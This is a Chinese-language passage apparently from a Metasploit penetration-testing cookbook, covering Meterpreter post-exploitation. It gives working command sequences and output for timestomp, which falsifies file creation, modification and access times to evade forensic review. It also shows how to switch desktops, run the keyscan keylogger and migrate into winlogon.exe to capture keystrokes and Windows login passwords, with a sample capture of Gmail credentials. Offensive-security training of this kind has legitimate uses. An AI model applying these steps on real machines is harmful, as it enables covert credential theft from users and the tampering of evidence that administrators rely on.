
## 准备工作

在开始操作之前，你可能会有一个关键问题。为什么要更改 MACE 值？黑客通常使用更改 MACE 值的方法，让目标用户认为该文件已在系统上存在很长时间且未被触碰或修改。在可疑活动发生时，管理员可能会检查最近修改的文件，以确定是否有任何文件被修改或访问。因此，使用这种技术，文件不会出现在最近访问或修改的项目列表中。尽管还有其他方法可以判断文件属性是否被修改，但这种技术仍然很有用。

让我们从目标机器上挑选一个文件并更改其 MACE 属性。以下截图显示了使用 timestomp 之前文件的各种 MACE 值：

![](img/6b6e557533100c0e47951d0e5e14c4ee_504_0.png)

现在，我们将继续更改各种 MACE 值。让我们从常用的 timestomp -h 命令开始，该命令用于列出各种可用选项。我们可以使用 -v 操作符来列出 MACE 属性的值：

```
meterpreter > timestomp C:\flag.txt -v
[*] Showing MACE attributes for C:\flag.txt
Modified  : 2017-10-30 12:24:57 -0400
Accessed  : 2017-10-30 12:24:57 -0400
Created   : 2017-10-30 12:24:57 -0400
Entry Modified: 2017-10-30 12:24:57 -0400
```

## 如何操作...

我们将首先更改文件的创建时间。请注意传递给 timestomp 命令的各种参数：

```
meterpreter > timestomp C:\flag.txt -c "05/25/2017 01:01:01"
[*] Setting specific MACE attributes on C:\flag.txt
```

## 工作原理...

-c 操作符用于更改文件的创建时间。类似地，我们可以使用 -m 和 -a 操作符来更改文件的修改时间和最后访问属性：

```
meterpreter > timestomp C:\flag.txt -m "05/25/2017 01:01:01"
[*] Setting specific MACE attributes on C:\flag.txt
meterpreter > timestomp C:\flag.txt -a "05/25/2017 01:01:01"
[*] Setting specific MACE attributes on C:\flag.txt
```

更改属性后，我们可以再次使用 -v 操作符来检查并验证命令是否成功执行。让我们继续检查文件属性：

```
meterpreter > timestomp C:\flag.txt -v
[*] Showing MACE attributes for C:\flag.txt
Modified  : 2017-05-25 02:01:01 -0400
Accessed  : 2017-05-25 02:01:01 -0400
Created   : 2017-05-25 02:01:01 -0400
Entry Modified: 2017-10-30 12:24:57 -0400
```

我们已成功修改了文件的文件 MACE 属性。现在，该文件可以很容易地从最近修改或最近访问的文件列表中隐藏起来。

另外，我们也可以使用 -z 操作符一次性更改全部四个 MACE 值。我们无需为每个值分别传递命令。但是，-z 操作符会为全部四个 MACE 属性分配相同的值，这在实际中是不可能的。创建时间与访问时间之间必须存在一定的时间差。因此，应避免使用 -z 操作符。

## 还有更多...

Metasploit 在其研究项目中创建了一组名为 **Metasploit 反取证调查工具包 (MAFIA)** 的工具，包括：

- Timestomp
- Slacker
- Transmogrify
- SAM Juicer

由于这些工具已超过 5 年未更新，因此它们不再与现代操作系统兼容。

## getdesktop 和键盘记录嗅探

在本教程中，我们将处理与桌面和键盘记录嗅探相关的一些 `stdapi` 用户界面命令。捕获击键取决于当前活动的桌面，因此了解如何通过在不同桌面活动会话中运行的进程之间切换来嗅探不同的击键至关重要。让我们继续本教程以更好地理解这一点。

### 准备工作

- `enumdesktops` 命令将列出所有可访问的桌面和窗口站：

```
meterpreter > enumdesktops
Enumerating all accessible desktops
```

| 会话 | 站点 | 名称 |
|---|---|---|
| 0 | WinSta0 | Default |
| 0 | WinSta0 | Disconnect |
| 0 | WinSta0 | Winlogon |

这里，你可以看到所有可用的桌面站都与 session 0 相关联。我们稍后会详细说明 session 0 的含义。

- getdesktop 命令返回当前 Meterpreter 会话正在工作的桌面信息：

```
meterpreter > getdesktop
Session 0\S\D
```

你可以将 getdesktop 命令的输出与 enumdesktops 关联起来，以更深入地了解我们当前正在工作的桌面站。

- setdesktop 命令用于将当前 Meterpreter 桌面更改为另一个可用的桌面站
- keyscan_start 命令用于在当前活动桌面站中启动键盘记录嗅探器
- keyscan_dump 命令转储活动 Meterpreter 桌面会话的已记录击键

现在，让我们分析这些命令在实时场景中的工作方式，以及如何通过不同的桌面站嗅探击键。

### 如何操作...

在继续本教程之前，我们将先了解一个关于 Windows 桌面的重要概念。

Windows 桌面分为不同的会话，以便定义我们可以与 Windows 机器交互的方式。Session 0 代表控制台。其他会话，如 Session 1、Session 2 等，代表远程桌面会话。

每个 Windows 会话可以由不同的站组成，其中 WinSta0 是唯一的交互式站，意味着它是用户唯一可以交互的站。WinSta0 由三个不同的桌面组成，即 Default、Disconnect 和 Winlogon。桌面是一个逻辑显示表面，包含用户界面对象，如窗口、菜单和钩子。Default 桌面与我们在桌面上执行的所有应用程序和任务相关联；Disconnect 桌面涉及屏幕保护程序锁定桌面，而 Winlogon 桌面则与 Windows 登录屏幕相关。

这里需要注意的是，每个桌面都有自己的键盘缓冲区。因此，如果你需要从 Default 桌面嗅探击键，你必须确保当前 Meterpreter 活动浏览器设置为 Session 0/WinSta0/Default。如果需要嗅探登录密码，你必须将活动桌面更改为 Session 0/WinSta0/Winlogon。

- 1. 让我们使用 getdesktop 命令检查当前桌面：

```
meterpreter > getdesktop
Session 0\S\D
```

如你所见，我们不在 WinSta0 站中，而 WinSta0 是唯一的交互式桌面站。因此，如果在此运行键盘捕获，将不会返回任何结果。

- 2. 让我们将桌面更改为 WinSta0\Default：

```
meterpreter > setdesktop
Changed to desktop WinSta0\Default
meterpreter > getdesktop
Session 0\WinSta0\Default
```

前面的命令行显示，我们已通过使用 setdesktop 命令移动到交互式 Windows 桌面站。

- 3. 因此，现在我们可以运行键盘记录嗅探器来捕获目标机器上用户按下的键：

```
meterpreter > keyscan_start
Starting the keystroke sniffer ...
meterpreter > keyscan_dump
Dumping captured keystrokes...
gmail.com<CR>
demouser<Right Shift>@gmail.com<CR>
<Right Shift>P4ssw0rd<CR>
```

查看转储的击键，你可以清楚地识别出目标用户访问了 gmail.com 并输入了他的/她的凭据以登录。

如果想嗅探 Windows 登录密码呢？显然，你可以使用 setdesktop 命令将活动桌面切换到 WinSta0\Winlogon，但这里我们也会讨论另一种方法。

- 4. 我们可以迁移到在 Windows 登录期间运行的进程。让我们执行 ps 命令来检查正在运行的进程：

```
meterpreter > ps
...
4336 5664 winlogon.exe x64 1 NT AUTHORITY\SYSTEM
C:\Windows\system32\winlogon.exe
...
```

你会发现 winlogon.exe 作为一个进程正在运行，并具有进程 ID。在本例中，winlogon.exe 的进程 ID (PID) 为 4336。

- 5. 现在，让我们迁移到此 PID 并再次检查活动桌面：

```
meterpreter > migrate 4336
[*] Migrating from 352 to 4336...
[*] Migration completed successfully.
meterpreter > getdesktop
Session 0\WinSta0\Winlogon
```

- 6. 你可以看到我们的活动桌面已更改为 WinSta0\Winlogon。现在，我们可以运行 keyscan_start 命令开始在 Windows 登录屏幕上嗅探击键：

```
meterpreter > keyscan_start
Starting the keystroke sniffer ...
```
